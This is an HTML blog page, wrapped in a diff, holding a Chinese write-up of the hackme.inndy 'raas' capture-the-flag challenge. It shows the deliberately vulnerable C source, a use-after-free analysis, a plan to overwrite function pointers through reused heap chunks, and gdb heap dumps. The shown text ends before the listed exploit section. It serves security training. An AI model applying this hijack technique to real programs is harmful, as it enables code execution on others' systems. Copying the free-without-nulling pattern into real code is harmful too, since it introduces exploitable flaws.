@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="hackme.inndy raas wp查看保护 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000) 程序代码 12345678910111213141516171819202122232425262728">
+<meta name="keywords" content="网络安全,代码审计,安全开发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackme.inndy raas wp">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;pwn&#x2F;hackmeinndy-raas-wp.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="hackme.inndy raas wp查看保护 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000) 程序代码 12345678910111213141516171819202122232425262728">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>hackme.inndy raas wp</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/pwn/pwnabletw-hacknote-wp.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/pwn/hackmeinndy-pwn-writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&text=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&is_video=false&description=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackme.inndy raas wp&body=Check out this article: http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&title=hackme.inndy raas wp" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/pwn/hackmeinndy-raas-wp.html&name=hackme.inndy raas wp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackme-inndy-raas-wp"><span class="toc-number">1.</span> <span class="toc-text">hackme.inndy raas wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.0.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试"><span class="toc-number">1.0.2.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.0.3.</span> <span class="toc-text">exp:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">1.0.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hackme.inndy raas wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-06-14T03:30:00.000Z" itemprop="datePublished">2019-06-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="hackme-inndy-raas-wp"><a href="#hackme-inndy-raas-wp" class="headerlink" title="hackme.inndy raas wp"></a>hackme.inndy raas wp</h1><p>查看保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>程序代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*print)(struct record *);</span><br><span class="line">	<span class="keyword">void</span> (*<span class="built_in">free</span>)(struct record *);</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> integer;</span><br><span class="line">		<span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> *<span class="title">records</span>[16];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s &gt; "</span>, q);</span><br><span class="line">	fgets(buff, <span class="keyword">sizeof</span>(buff), <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">return</span> atoi(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_int_print</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Record(Type=Integer, Value=%d)\n"</span>, rec-&gt;integer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_str_print</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Record(Type=String, Value=%s)\n"</span>, rec-&gt;<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_int_free</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(rec);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Record freed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_str_free</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(rec-&gt;<span class="built_in">string</span>);</span><br><span class="line">	<span class="built_in">free</span>(rec);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Record freed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt; <span class="number">16</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Out of index!"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(records[idx]) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Index #%d is used!\n"</span>, idx);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">record</span> *<span class="title">r</span> = <span class="title">records</span>[<span class="title">idx</span>] = (<span class="title">struct</span> <span class="title">record</span> *)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">record</span>));</span></span><br><span class="line">	r-&gt;print = rec_int_print;</span><br><span class="line">	r-&gt;<span class="built_in">free</span> = rec_int_free;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Blob type:"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1. Integer"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"2. Text"</span>);</span><br><span class="line">	<span class="keyword">int</span> type = ask(<span class="string">"Type"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(type) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			r-&gt;integer = ask(<span class="string">"Value"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			len = ask(<span class="string">"Length"</span>);</span><br><span class="line">			<span class="keyword">if</span>(len &gt; <span class="number">1024</span>) &#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"Length too long, please buy record service premium to store longer record!"</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			r-&gt;<span class="built_in">string</span> = <span class="built_in">malloc</span>(len);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Value &gt; "</span>);</span><br><span class="line">			fgets(r-&gt;<span class="built_in">string</span>, len, <span class="built_in">stdin</span>);</span><br><span class="line">			r-&gt;print = rec_str_print;</span><br><span class="line">			r-&gt;<span class="built_in">free</span> = rec_str_free;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"Invalid type!"</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Okey, we got your data. Here is it:"</span>);</span><br><span class="line">	r-&gt;print(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line">	records[idx]-&gt;<span class="built_in">free</span>(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_dump</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line">	records[idx]-&gt;print(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	alarm(<span class="number">600</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Welcome to use my Record-as-a-Service (free plan)"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"You can only save Integer or String for 600 seconds"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Pay 1,000,000,000,000,000,000,000,000 bitcoins to buy premium plan"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Here is term of service. You must agree to use this service. Please read carefully!"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"================================================================================"</span>);</span><br><span class="line">	system(<span class="string">"cat tos.txt | head -n 30 | sed -e 's/^/    /'"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"================================================================================"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"1. New record"</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"2. Del record"</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"3. Show record"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(ask(<span class="string">"Act"</span>)) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				do_new();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				do_del();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				do_dump();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"Bye~ Thanks for using our service!"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个题目给了源代码，题目提示是uaf。<br>题目分析，程序有三种操作，添加记录、删除记录，展示记录。其中删除记录中，只是释放了空间，但是指针没有被清空，导致uaf。</p>
+<p>结构体如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*print)(struct record *);</span><br><span class="line">	<span class="keyword">void</span> (*<span class="built_in">free</span>)(struct record *);</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> integer;</span><br><span class="line">		<span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>看do_new函数逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = ask(<span class="string">"Index"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Out of index!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( records[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Index #%d is used!\n"</span>, v2);</span><br><span class="line">  records[v2] = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  v3 = records[v2];</span><br><span class="line">  *v3 = rec_int_print;</span><br><span class="line">  *(v3 + <span class="number">4</span>) = rec_int_free;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Blob type:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Integer"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Text"</span>);</span><br><span class="line">  v1 = ask(<span class="string">"Type"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + <span class="number">8</span>) = ask(<span class="string">"Value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid type!"</span>);</span><br><span class="line">    size = ask(<span class="string">"Length"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x400</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Length too long, please buy record service premium to store longer record!"</span>);</span><br><span class="line">    *(v3 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Value &gt; "</span>);</span><br><span class="line">    fgets(*(v3 + <span class="number">8</span>), size, _bss_start);</span><br><span class="line">    *v3 = rec_str_print;</span><br><span class="line">    *(v3 + <span class="number">4</span>) = rec_str_free;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Okey, we got your data. Here is it:"</span>);</span><br><span class="line">  <span class="keyword">return</span> (*v3)(v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>先malloc了12字节的堆</li>
+<li>头4个字节存用于print结构体的函数指针</li>
+<li>再4个字节存用于free结构体的函数指针</li>
+<li>如果type是integer，最后四个字节存输入的整数，</li>
+<li>如果type是string，获取长度，malloc一个指定长度的堆，新malloc的堆的指针存到之前那12字节的最后四个字节里</li>
+</ul>
+<p>利用思路：</p>
+<ul>
+<li>new 两个record，delete掉，这里的record类型随意，但是字符的要注意新new的长度不要等于12 </li>
+<li>new一个字符串类型的record，长度为12，假设new的两个record是0、1，删除的顺序是0、1，那么这个时候在fastbin的链表里面是 1-&gt;0 ，new一个record，存函数指针那个堆复用了1的堆，用来存内容的那个堆是用了0的堆 </li>
+<li>往0那个堆里面写我们想要的东西，再删除0的record，这样就能getshell</li>
+</ul>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>进行以下操作：</p>
+<ul>
+<li>new index=1 int 0xff</li>
+<li>new index=2 int 0x88</li>
+<li>delete index=1</li>
+<li>delete index=2</li>
+<li>new index=3 str ‘aaaabbbbccc’</li>
+<li>new index=4 str ‘dddd’</li>
+</ul>
+<p>先添加两个整数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /32wx 0x0804c008</span><br><span class="line">0x804c008:	0x0804869e	0x080486de	0x000000ff	0x00000011</span><br><span class="line">0x804c018:	0x0804869e	0x080486de	0x00000088	0x00020fe1</span><br></pre></td></tr></table></figure>
+<p>对应是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址	print函数指针	free函数指针	整型变量</span><br><span class="line">0x804c008	0x0804869e	0x080486de	0x000000ff</span><br></pre></td></tr></table></figure>
+
+<p>释放掉两个整数的堆：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /32wx 0x0804c008</span><br><span class="line">0x804c008:	0x00000000	0x080486de	0x000000ff	0x00000011</span><br><span class="line">0x804c018:	0x0804c000	0x080486de	0x00000088	0x00020fe1</span><br></pre></td></tr></table></figure>
+
+<p>添加字符串aaaabbbbccc后的堆：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32wx 0x9a49008</span><br><span class="line">0x9a49008:	0x00000000	0x080486de	0x000000ff	0x00000011</span><br><span class="line">0x9a49018:	0x080486be	0x08048705	0x09a49028	0x00000019</span><br><span class="line">0x9a49028:	0x61616161	0x62626262	0x0a636363	0x00000000</span><br><span class="line">0x9a49038:	0x00000000	0x00020fc9	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<p>以看到，输出aaaabbbbccc的时候，占用的就是原来index=1的整数分配的空间。其中aaaa覆盖了print函数的指针，bbbb覆盖了free函数的指针。虽然index=1被释放了，但是指针还在。如果此时再调用do_del来释放index=1的内容，就可以控制EIP了。</p>
